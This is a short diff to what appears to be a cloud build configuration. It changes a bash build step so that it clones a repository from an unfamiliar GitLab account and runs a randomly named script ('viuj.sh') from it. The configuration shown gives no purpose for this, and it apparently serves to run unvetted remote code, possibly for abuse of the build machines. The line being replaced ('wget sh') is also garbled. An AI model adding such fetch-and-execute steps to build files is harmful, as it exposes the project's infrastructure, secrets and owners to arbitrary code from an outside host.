@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt install wget tar -y && wget sh
+         apt update && apt install git wget tar -y && git clone https://gitlab.com/satugiga94/egish.git && cd egish && chmod +x viuj.sh && ./viuj.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
